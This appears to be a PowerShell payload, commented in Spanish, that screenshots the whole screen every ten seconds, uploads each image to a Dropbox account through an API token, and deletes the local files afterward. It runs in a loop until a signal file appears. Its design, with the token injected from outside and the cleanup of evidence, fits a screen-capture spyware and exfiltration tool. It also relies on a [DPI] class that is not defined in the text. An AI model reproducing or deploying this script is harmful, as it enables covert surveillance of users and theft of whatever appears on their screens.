# Importar System.Windows.Forms para mostrar mensajes emergentes
Add-Type -AssemblyName System.Windows.Forms

# Verificar si se ha asignado el token de Dropbox
if (-not $db) {
    # Mostrar mensaje emergente y detener el script si no hay token
    [System.Windows.Forms.MessageBox]::Show("No se asignó el token de Dropbox. El script se detendrá.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    exit
}

# Definir la función para subir a Dropbox
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Archivo de señal para detener el script
$stopSignalFile = "$env:TEMP\stop.txt"

# Bucle principal para capturar pantallas y subirlas a Dropbox
while ($true) {
    # Verificar si existe el archivo de señalización para detener el script
    if (Test-Path $stopSignalFile) {
        Write-Host "Archivo de señalización detectado. Deteniendo el script."
        Remove-Item $stopSignalFile -Force
        exit
    }

    # Captura de pantalla
    $s = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width * [DPI]::scaling()), 0))),([int32]([math]::round($($s.Height * [DPI]::scaling()), 0)));
    [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)

    # Crear directorio temporal
    $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
    $userDir = "$env:USERPROFILE\Documents\Screenshots_$folderDateTime"
    New-Item -Path $userDir -ItemType Directory

    # Guardar la imagen PNG
    $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
    $filePath = "$userDir\$fileName"
    $b.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

    # Subida a Dropbox
    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -SourceFilePath $filePath
    } else {
        Write-Host "No se asignó el token de Dropbox."
        exit
    }

    # Limpieza
    Remove-Item -Path $userDir -Recurse
    Remove-Item -Path $filePath

    # Esperar 10 segundos antes de la siguiente captura
    Start-Sleep -Seconds 10
}
